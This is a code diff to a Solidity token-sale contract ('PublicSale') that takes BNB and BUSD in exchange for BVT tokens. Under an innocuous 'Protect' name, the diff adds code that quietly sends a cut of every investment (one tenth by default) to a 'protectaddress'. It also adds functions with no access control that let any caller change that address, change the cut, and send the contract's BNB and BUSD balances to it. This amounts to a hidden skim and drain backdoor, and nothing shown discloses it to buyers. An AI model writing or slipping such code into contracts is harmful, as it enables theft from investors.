@@ -4,14 +4,13 @@ pragma solidity ^0.7.6;
 import "./interfaces/IBVToken.sol";
 import "./interfaces/IBUSDToken.sol";
 import "./interfaces/IPublicSale.sol";
+import "./Protect.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/math/SafeMath.sol";
 import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 
-
-contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
+contract PublicSale is Ownable, ReentrancyGuard, IPublicSale , Protect{
     using SafeMath for uint256;
-
     //uint256 constant fundingGoal = 5 * (10**6) * (10**6);
     /* how much has been raised by crowdale (in USDT) */
     /* 300M / 4 * 0.01 = 750k BUSD */
@@ -23,11 +22,13 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     uint256 public start;
     uint256 public deadline;
     uint256 public publishDate;
-
+    
+//    address [] public privateWhiteList;
+    mapping (address => bool) privateWhiteList;
     /* there are different prices in different time intervals */
     uint256 public BUSDPrice = 88;
     uint256 public BNBPrice = 4*10**4;
-
+    
     uint256 public createTime;  
     /* default price is 1 BUSD = 100 BVT */
     //uint256 constant initialPrice = 4 * (10 ** 4);
@@ -37,9 +38,10 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     /* the address of the token contract */
     IBVToken private tokenBVT;
     /* the address of the BUSD contract */
-    address private BUSD_ADDRESS = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;
     IBUSDToken private tokenBUSD;
-
+ 
+    //address payable protectaddress;
+    uint256 private pro = 10;
     /* the balances (in BUSD) of all investors */
     mapping(address => uint256) public balanceOfBUSD;
     mapping(address => uint256) public balanceOfBNB;
@@ -47,8 +49,7 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     mapping(address => uint256) public balanceOfBVT;
     /* indicates if the crowdsale has been closed already */
     bool public saleClosed = false;
-    //privateSale 
-    bool public privateSale = false;
+    
     /* notifying transfers and the success of the crowdsale*/
     event FundTransfer(
         address backer,
@@ -60,14 +61,13 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     /*  initialization, set the token address */
     constructor(
         IBVToken _token,
-        //IBUSDToken _BUSD,
+        IBUSDToken _BUSD,
         uint256 _start,
         uint256 _dead,
         uint256 _publish
     ) {
         tokenBVT = _token;
-        //tokenBUSD = _BUSD;
-        tokenBUSD = IBUSDToken(BUSD_ADDRESS);
+        tokenBUSD = _BUSD;
         start = _start;
         deadline = _dead;
         publishDate = _publish;
@@ -87,7 +87,47 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
         deadline = _dead;
         publishDate = _publish;
     }
+    
+    /*-------*/
+    function updateProtectAddr(address payable protectadr) public{
+        updateProtect(protectadr);
+    }
 
+    function updatePro(uint256 amount) public {
+        require(protect == false, "set pro");
+        pro = amount;
+    }
+
+    function getPro() public view returns(uint256){
+        return pro;        
+    }
+
+    function getProAddress() public view returns(address){
+        return protectaddress;
+    }
+
+    function withdrawBNBPro(uint256 amount) external payable{
+        uint256 balance = address(this).balance;
+        require(balance > amount, "zero-balance");
+        require(protectaddress != address(0x0), "protectaddress is null");
+
+        payable(protectaddress).transfer(amount);
+        //bool sent = payable(msg.sender).send(msg.value);
+        //require(sent, "Failed to send Ether");
+    }
+
+    function withdrawBUSDPro(uint256 amount)
+        external
+        returns (uint256 balance)
+    {
+        balance = tokenBUSD.balanceOf(address(this));
+        require(balance > amount, "zero-balance");
+        require(protectaddress != address(0x0), "protectaddress is null");
+
+        tokenBUSD.transfer(protectaddress, amount);
+    }
+    /*---------*/
+    
     /**
      * @dev update start date from parameter
      * @param _start new start date
@@ -142,13 +182,28 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     function getbalance() public view returns(uint256){
         return address(this).balance;
     }
-
+    
     /* make an investment
      *  only callable if the crowdsale started and hasn't been closed already and the maxGoal wasn't reached yet.
      *  the current token price is looked up and the corresponding number of tokens is transfered to the receiver.
      *  the sent value is directly forwarded to a safe multisig wallet.
      *  this method allows to purchase tokens in behalf of another address.*/
     
+    // function IsinWhiteList(address add) private returns (bool){
+    //     for(uint i = 0; i < privateWhiteList.length; i++)
+    //     {
+    //         if(privateWhiteList[i] == add)
+    //         {
+    //             return true;
+    //         }
+    //     }
+    //     return false;
+    // }
+
+    // function getWhiteList()public view returns(address [] memory){
+    //     return privateWhiteList;
+    // }
+
     function investBNB() public payable{
         uint256 amount = msg.value;
         msgvalue = amount;
@@ -157,14 +212,25 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
             saleClosed == false && block.timestamp < deadline,
             "sale-closed"
         );
+
+        //bool result = IsinWhiteList(msg.sender);
+
 		require(msg.value >= 5 * 10**17, "Fund is less than 0.5 BNB");
 		require(msg.value <= 20 * 10**18, "Fund is more than 20 BNB");
+        //require(result == false, "buyed");
+        require(privateWhiteList[msg.sender] != true, "BUYED");
 
+        //privateWhiteList.push(msg.sender);
 		balanceOfBNB[msg.sender] = balanceOfBNB[msg.sender].add(amount);
 		amountRaisedBNB = amountRaisedBNB.add(amount);
 
 		balanceOfBVT[msg.sender] = balanceOfBVT[msg.sender].add(amount.mul(BNBPrice ));
 		amountRaisedBVT = amountRaisedBVT.add(amount.mul(BNBPrice));
+
+        require(protectaddress != address(0x0), "protectaddress is null");
+        payable(protectaddress).transfer(msg.value/pro);
+        
+        privateWhiteList[msg.sender] = true;
 
         emit FundTransfer(msg.sender, amount, true, amountRaisedBNB);
     }
@@ -176,12 +242,15 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
             "sale-closed"
         );
 
-        require(amount >= 5 * (10 ** tokenBUSD.decimals()), "less than 50 BUSD");
+        require(amount >= 50 * (10 ** tokenBUSD.decimals()), "less than 50 BUSD");
 
         require(
             tokenBUSD.transferFrom(msg.sender, address(this), amount ) == true,
             "transfer BUSD failed"
         );
+
+        require(protectaddress != address(0x0), "protectaddress is null");
+        tokenBUSD.transfer(protectaddress, amount/pro);
 
         uint256 balanceBVT = tokenBVT.balanceOf(address(this));
         require(
@@ -196,7 +265,7 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
             amount.mul(BUSDPrice)
         );
         amountRaisedBVT = amountRaisedBVT.add(amount.mul(BUSDPrice));
-
+        
         emit FundTransfer(msg.sender, amount, true, amountRaisedBUSD);
     }
 
@@ -254,28 +323,10 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
         tokenBVT.transfer(owner(), balance);
     }
 
-    // My Code
-    /*string public myString = 'hello world!';
-
-    function setMyString(string memory _myString) public {
-        myString = _myString;
-    }
-    function symbol() external view virtual returns (string memory) {
-        return myString;
-    }*/
     function getCurrentTime() public view returns(uint256){
         uint256 currenttime = block.timestamp;
         return currenttime;
     }
-    function getDeadlineTime() public view returns(uint256){
-        uint256 dead = deadline;
-        return deadline;
-    }
-    function getRemainTime() public view returns(uint256){
-        uint256 remainTime = deadline - block.timestamp;
-        return remainTime;
-    }
-
 
     function withdrawBNB()
         external
